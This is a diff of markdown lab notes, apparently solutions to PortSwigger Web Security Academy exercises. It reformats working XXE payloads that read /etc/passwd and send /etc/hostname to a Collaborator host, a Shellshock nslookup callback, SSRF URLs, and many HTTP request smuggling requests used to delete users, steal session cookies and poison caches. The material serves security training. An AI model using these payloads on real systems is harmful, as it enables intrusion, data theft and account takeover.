+   ```html
+   <!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY
+   &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval;
+   %exfil;
+   ```
 
 4. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
 5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 6. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 
-`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
+   ```html
+   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+   ```
 
 7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
 8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.
@@ -2917,8 +3112,10 @@ can host your malicious DTD.
 
 1. Click "Go to exploit server" and save the following malicious DTD file on your server:
 
-`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25;
-exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;`
+   ```html
+   <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25;
+   exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;
+   ```
 
 When imported, this page will read the contents of `/etc/passwd` into the
 `file` entity, and then try to use that entity in a file path.
@@ -2954,8 +3151,10 @@ By default, `XInclude` will try to parse the included document as XML. Since
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Set the value of the `productId` parameter to:
 
-`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"
-href="file:///etc/passwd"/></foo>`
+   ```html
+   <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"
+   href="file:///etc/passwd"/></foo>
+   ```
 
 ### Lab: Exploiting XXE via image file upload
 
@@ -2974,10 +3173,12 @@ The SVG image format uses XML.
 
 1. Create a local SVG image with the following content:
 
-`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM
-"file:///etc/hostname" > ]><svg width="128px" height="128px"
-xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
+   ```html
+   <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM
+   "file:///etc/hostname" > ]><svg width="128px" height="128px"
+   xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+   version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+   ```
 
 2. Post a comment on a blog post, and upload this image as an avatar.
 3. When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the "Submit solution" button to submit the value of the server hostname.
@@ -3005,11 +3206,14 @@ Systems using the GNOME desktop environment often have a DTD at
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
 
-`<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM
-"file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY
-&#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY
-&#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
-&#x25;eval; &#x25;error; '> %local_dtd; ]>` This will import the Yelp DTD,
+   ```html
+   <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM
+   "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY
+   &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY
+   &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+   &#x25;eval; &#x25;error; '> %local_dtd; ]>
+   ``` 
+This will import the Yelp DTD,
 then redefine the `ISOamso` entity, triggering an error message containing the
 contents of the `/etc/passwd` file.
 
@@ -3029,7 +3233,7 @@ To solve the lab, change the stock check URL to access the admin interface at
 3. Change the URL in the `stockApi` parameter to `http://localhost/admin`. This should display the administration interface.
 4. Read the HTML to identify the URL to delete the target user, which is:
 
-`http://localhost/admin/delete?username=carlos`
+   `http://localhost/admin/delete?username=carlos`
 
 5. Submit this URL in the `stockApi` parameter, to deliver the SSRF attack.
 
@@ -3108,12 +3312,12 @@ you will need to find an open redirect affecting the application first.
 3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
 4. Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the `stockApi` parameter on the stock checker:
 
-`/product/nextProduct?path=http://192.168.0.12:8080/admin`
+   `/product/nextProduct?path=http://192.168.0.12:8080/admin`
 
 5. Observe that the stock checker follows the redirection and shows you the admin page.
 6. Amend the path to delete the target user:
 
-`/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+   `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
 
 - [Lab](/web-security/ssrf/blind/lab-shellshock-exploitation)
 
@@ -3143,7 +3347,7 @@ To solve the lab, you must use Burp Collaborator's default public server.
 6. Send the request to the product page to Burp Intruder.
 7. Go to the [ Collaborator ](/burp/documentation/desktop/tools/collaborator) tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
 
-`() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
+   `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
 
 8. Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
 9. Change the `Referer` header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click **Add §**.
@@ -3170,12 +3374,13 @@ The developer has deployed an anti-SSRF defense you will need to bypass.
 5. Double-URL encode the `#` to `%2523` and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
 6. To access the admin interface and delete the target user, change the URL to:
 
-`http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
+   `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
 
 ## HTTP request smuggling
 ### Finding HTTP request smuggling vulnerabilities using timing techniques
 ##### Chunked encoding structure:
 `Transfer-Encoding: chunked`
+
 ```http
 <chunk size in hex>
 <chunk data>
@@ -3183,6 +3388,7 @@ The developer has deployed an anti-SSRF defense you will need to bypass.
 <next chunk data>
 0
 ```
+
 #### Finding CL.TE vulnerabilities using timing techniques
 [article](https://portswigger.net/web-security/request-smuggling/finding)
 
@@ -3224,7 +3430,11 @@ If the response to the normal request contains the expected interference, then t
 
 For example, suppose the normal request looks like this:
 
-`POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling`
+   ```http
+   POST /search HTTP/1.1 
+   Host: vulnerable-website.com
+   Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling
+   ```
 
 This request normally receives an HTTP response with status code 200, containing some search results.
 
@@ -3234,7 +3444,9 @@ The attack request that is needed to interfere with this request depends on the 
 
 To confirm a CL.TE vulnerability, you would send an attack request like this:
 
-`POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 49 Transfer-Encoding: chunked e q=smuggling&x= 0 GET /404 HTTP/1.1 Foo: x`
+   ```http
+   POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 49 Transfer-Encoding: chunked e q=smuggling&x= 0 GET /404 HTTP/1.1 Foo: x
+   ```
 
 If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
 
@@ -3245,7 +3457,7 @@ Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 11
 q=smuggling
-````
+```
 
 #### Confirming TE.CL vulnerabilities using differential responses
 
@@ -3275,7 +3487,9 @@ You need to include the trailing sequence `\r\n\r\n` following the final `0`.
 
 If the attack is successful, then everything from `GET /404` onwards is treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
 
-`GET /404 HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 146 x= 0 POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling`
+```http
+GET /404 HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 146 x= 0 POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling
+```
 
 #### TE.TE behavior: obfuscating the TE header
 Here, the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
@@ -3360,10 +3574,12 @@ In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Lengt
 
 Using Burp Repeater, issue the following request twice:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
-5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-
-Length: 15 x=1 0`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
+   5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-
+   Length: 15 x=1 0
+   ```
 
 The second request should receive an HTTP 404 response.
 
@@ -3405,25 +3621,31 @@ chunked 0 GET /admin HTTP/1.1 X-Ignore: X`
 3. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
 4. Issue the following request twice:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding:
-chunked 0 GET /admin HTTP/1.1 Host: localhost X-Ignore: X`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding:
+   chunked 0 GET /admin HTTP/1.1 Host: localhost X-Ignore: X
+   ```
 
 5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
 6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding:
-chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-
-form-urlencoded Content-Length: 10 x=`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding:
+   chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-
+   form-urlencoded Content-Length: 10 x=
+   ```
 
 7. Observe that you can now access the admin panel.
 8. Using the previous response as a reference, change the smuggled request URL to delete `carlos`:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding:
-chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-
-Type: application/x-www-form-urlencoded Content-Length: 10 x=`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding:
+   chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-
+   Type: application/x-www-form-urlencoded Content-Length: 10 x=
+   ```
 
 ###### Jarno Timmermans
 
@@ -3468,18 +3690,22 @@ You need to include the trailing sequence `\r\n\r\n` following the final `0`.
 4. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
 5. Issue the following request twice:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
-71 POST /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-
-urlencoded Content-Length: 15 x=1 0`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
+   71 POST /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-
+   urlencoded Content-Length: 15 x=1 0
+   ```
 
 6. Observe that you can now access the admin panel.
 7. Using the previous response as a reference, change the smuggled request URL to delete `carlos`:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4
-Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host:
-localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15
-x=1 0`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4
+   Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host:
+   localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15
+   x=1 0
+   ```
 
 ###### Jarno Timmermans
 
@@ -3502,7 +3728,8 @@ deletes the user `carlos`.
 
 Although the lab supports HTTP/2, the intended solution requires techniques
 that are only possible in HTTP/1. You can manually switch protocols in Burp
-Repeater from the **Request attributes** section of the **Inspector** panel.
+Repeater from the **Request ``http
+attributes** section of the **Inspector** panel.
 
 ##### Tip
 
@@ -3525,18 +3752,22 @@ Content-Length: 200 Connection: close search=test`
 4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
 5. Make a note of the name of the `X-*-IP` header in the rewritten request, and use it to access the admin panel:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 143 Transfer-Encoding:
-chunked 0 GET /admin HTTP/1.1 X-abcdef-Ip: 127.0.0.1 Content-Type:
-application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 143 Transfer-Encoding:
+   chunked 0 GET /admin HTTP/1.1 X-abcdef-Ip: 127.0.0.1 Content-Type:
+   application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1
+   ```
 
 6. Using the previous response as a reference, change the smuggled request URL to delete the user `carlos`:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 166 Transfer-Encoding:
-chunked 0 GET /admin/delete?username=carlos HTTP/1.1 X-abcdef-Ip: 127.0.0.1
-Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection:
-close x=1`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 166 Transfer-Encoding:
+   chunked 0 GET /admin/delete?username=carlos HTTP/1.1 X-abcdef-Ip: 127.0.0.1
+   Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection:
+   close x=1
+   ```
 
 ### Lab: Exploiting HTTP request smuggling to capture other users' requests
 
@@ -3572,12 +3803,14 @@ prefix.
 2. Send the `comment-post` request to Burp Repeater, shuffle the body parameters so the `comment` parameter occurs last, and make sure it still works.
 3. Increase the `comment-post` request's `Content-Length` to 400, then smuggle it to the back-end server:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 256 Transfer-Encoding:
-chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-
-urlencoded Content-Length: 400 Cookie: session=your-session-token csrf=your-
-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-
-user.net&website=&comment=test`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 256 Transfer-Encoding:
+   chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-
+   urlencoded Content-Length: 400 Cookie: session=your-session-token csrf=your-
+   csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-
+   user.net&website=&comment=test
+   ```
 
 4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
 5. Copy the user's Cookie header from the comment, and use it to access their account.
@@ -3620,15 +3853,17 @@ install it via the BApp Store.
 2. Observe that the comment form contains your `User-Agent` header in a hidden input.
 3. Inject an XSS payload into the `User-Agent` header and observe that it gets reflected:
 
-`"/><script>alert(1)</script>`
+   `"/><script>alert(1)</script>`
 
 4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding:
-chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent:
-a"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded
-Content-Length: 5 x=1`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding:
+   chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent:
+   a"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded
+   Content-Length: 5 x=1
+   ```
 
 ##### Note
 
@@ -3663,8 +3898,10 @@ chunked 0 SMUGGLED`
 
 3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.
 
-`POST /x HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Transfer-Encoding:
-chunked 0 GET /x HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net`
+   ```http
+   POST /x HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Transfer-Encoding:
+   chunked 0 GET /x HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net
+   ```
 
 ##### Note
 
@@ -3710,8 +3947,10 @@ page every 10 seconds.
 
 1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a `Content-Length: 0` header as follows. Remember to expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2 before sending the request.
 
-`POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0
-SMUGGLED`
+   ```http
+   POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0
+   SMUGGLED
+   ```
 
 2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
 
@@ -3719,8 +3958,10 @@ SMUGGLED`
 
 4. Create the following request to smuggle the start of a request for `/resources`, along with an arbitrary `Host` header:
 
-`POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0
-GET /resources HTTP/1.1 Host: foo Content-Length: 5 x=1`
+   ```http
+   POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0
+   GET /resources HTTP/1.1 Host: foo Content-Length: 5 x=1
+   ```
 
 5. Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.
 
@@ -3728,9 +3969,11 @@ GET /resources HTTP/1.1 Host: foo Content-Length: 5 x=1`
 
 7. In Burp Repeater, edit your malicious request so that the `Host` header points to your exploit server:
 
-`POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0
-GET /resources HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
-Content-Length: 5 x=1`
+   ```http
+   POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0
+   GET /resources HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+   Content-Length: 5 x=1
+   ```
 
 8. Send the request a few times and confirm that you receive a redirect to the exploit server.
 
@@ -3740,9 +3983,6 @@ Content-Length: 5 x=1`
 
 11. Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.
 
-###### Jarno Timmermans
-
-ab-request-smuggling-h2-request-smuggling-via-crlf-injection)
 
 ### Lab: HTTP/2 request smuggling via CRLF injection
 
@@ -3754,8 +3994,7 @@ access to another user's account. The victim accesses the home page every 15
 seconds.
 
 If you're not familiar with Burp's exclusive features for HTTP/2 testing,
-please refer to [the documentation](/burp/documentation/desktop/http2) for
-details on how to use them.
+please refer to [the documentation](/burp/documentation/desktop/http2) for details on how to use them.
 
 ##### Hint
 
@@ -3795,8 +4034,10 @@ smuggled prefix
 
 5. Change the body of the request to the following:
 
-`0 POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
-session=YOUR-SESSION-COOKIE Content-Length: 800 search=x`
+   ```http
+   0 POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
+   session=YOUR-SESSION-COOKIE Content-Length: 800 search=x
+   ```
 
 6. Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive:
    - If you got lucky with your timing, you may see a `404 Not Found` response. In this case, refresh the page again and move on to the next step.
@@ -3806,10 +4047,6 @@ session=YOUR-SESSION-COOKIE Content-Length: 800 search=x`
 7. Check the recent searches list. If it contains a `GET` request, this is the start of the victim user's request and includes their session cookie. If you instead see your own `POST` request, you refreshed the page too early. Try again until you have successfully stolen the victim's session cookie.
 
 8. In Burp Repeater, send a request for the home page using the stolen session cookie to solve the lab.
-
-###### Jarno Timmermans
-
-ab-request-smuggling-h2-request-splitting-via-crlf-injection)
 
 ### Lab: HTTP/2 request splitting via CRLF injection
 
@@ -3845,7 +4082,7 @@ not available when you double-click on the header.
 
 **Value**
 
-`bar\r\n \r\n GET /x HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net`
+   `bar\r\n \r\n GET /x HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net`
 
 4. Send the request. When the front-end server appends `\r\n\r\n` to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.
 
@@ -3859,8 +4096,10 @@ again.
 
 6. Copy the session cookie and use it to send the following request:
 
-`GET /admin HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
-session=STOLEN-SESSION-COOKIE`
+   ```http
+   GET /admin HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
+   session=STOLEN-SESSION-COOKIE
+   ```
 
 7. Send the request repeatedly until you receive a 200 response containing the admin panel.
 
@@ -3908,9 +4147,11 @@ powered-desync-attacks#cl.0).
 
 4. In the body, add an arbitrary request smuggling prefix. The result should look something like this:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
-session=YOUR-SESSION-COOKIE Connection: close Content-Type: application/x-www-
-form-urlencoded Content-Length: CORRECT GET /hopefully404 HTTP/1.1 Foo: x`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie:
+   session=YOUR-SESSION-COOKIE Connection: close Content-Type: application/x-www-
+   form-urlencoded Content-Length: CORRECT GET /hopefully404 HTTP/1.1 Foo: x
+   ```
 
 5. Change the path of the main `POST` request to point to an arbitrary endpoint that you want to test.
 
@@ -3933,9 +4174,11 @@ form-urlencoded Content-Length: CORRECT GET /hopefully404 HTTP/1.1 Foo: x`
 
 3. Smuggle a request to `GET /admin/delete?username=carlos` request to solve the lab.
 
-`POST /resources/images/blog.svg HTTP/1.1 Host: YOUR-LAB-ID.web-security-
-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: keep-alive
-Content-Length: CORRECT GET /admin/delete?username=carlos HTTP/1.1 Foo: x`
+   ```http
+   POST /resources/images/blog.svg HTTP/1.1 Host: YOUR-LAB-ID.web-security-
+   academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: keep-alive
+   Content-Length: CORRECT GET /admin/delete?username=carlos HTTP/1.1 Foo: x
+   ```
 
 ### Lab: HTTP request smuggling, basic CL.TE vulnerability
 
@@ -3963,9 +4206,11 @@ install it via the BApp Store.
 
 Using Burp Repeater, issue the following request twice:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: keep-
-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6
-Transfer-Encoding: chunked 0 G`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: keep-
+   alive Content-Type: application/x-www-form-urlencoded Content-Length: 6
+   Transfer-Encoding: chunked 0 G
+   ```
 
 The second response should say: `Unrecognized method GPOST`.
 
@@ -4000,10 +4245,12 @@ Length" option is unchecked.
 
 Using Burp Repeater, issue the following request twice:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
-5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-
-Length: 15 x=1 0`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
+   5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-
+   Length: 15 x=1 0
+   ```
 
 ##### Note
 
@@ -4042,10 +4289,12 @@ Length" option is unchecked.
 
 Using Burp Repeater, issue the following request twice:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
-Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: application/x-www-
-form-urlencoded Content-Length: 15 x=1 0`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked
+   Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: application/x-www-
+   form-urlencoded Content-Length: 15 x=1 0
+   ```
 
 ##### Note
 
@@ -4082,10 +4331,12 @@ install it via the BApp Store.
 
 1. Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 129 Transfer-Encoding:
-chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: anything Content-Type:
-application/x-www-form-urlencoded Content-Length: 10 x=1`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 129 Transfer-Encoding:
+   chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: anything Content-Type:
+   application/x-www-form-urlencoded Content-Length: 10 x=1
+   ```
 
 2. Observe that you can use this request to make the next request to the website get redirected to `/post` on a host of your choice.
 3. Go to your exploit server, and create a `text/javascript` file at `/post` with the contents:
@@ -4094,16 +4345,20 @@ application/x-www-form-urlencoded Content-Length: 10 x=1`
 
 4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 193 Transfer-Encoding:
-chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-
-ID.exploit-server.net Content-Type: application/x-www-form-urlencoded Content-
-Length: 10 x=1`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 193 Transfer-Encoding:
+   chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-
+   ID.exploit-server.net Content-Type: application/x-www-form-urlencoded Content-
+   Length: 10 x=1
+   ```
 
 5. Then fetch `/resources/js/tracking.js` by sending the following request:
 
-`GET /resources/js/tracking.js HTTP/1.1 Host: YOUR-LAB-ID.web-security-
-academy.net Connection: close`
+   ```http
+   GET /resources/js/tracking.js HTTP/1.1 Host: YOUR-LAB-ID.web-security-
+   academy.net Connection: close
+   ```
 
 If the attack has succeeded, the response to the `tracking.js` request should
 be a redirect to your exploit server.
@@ -4150,9 +4405,11 @@ install it via the BApp Store.
 2. Observe that the response doesn't have any anti-caching headers.
 3. Smuggle a request to fetch the API key:
 
-`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
-application/x-www-form-urlencoded Content-Length: 42 Transfer-Encoding:
-chunked 0 GET /my-account HTTP/1.1 X-Ignore: X`
+   ```http
+   POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type:
+   application/x-www-form-urlencoded Content-Length: 42 Transfer-Encoding:
+   chunked 0 GET /my-account HTTP/1.1 X-Ignore: X
+   ```
 
 4. Repeat this request a few times, then load the home page in an incognito browser window.
 5. Use the Search function on the Burp menu to see if the phrase "Your API Key" has appeared in any static resources. If it hasn't, repeat the POST requests, force-reload the browser window, and re-run the search.
@@ -4216,9 +4473,11 @@ header names.
 
 7. Send the request and observe that the response now reflects the headers that were appended to your request by the front-end server:
 
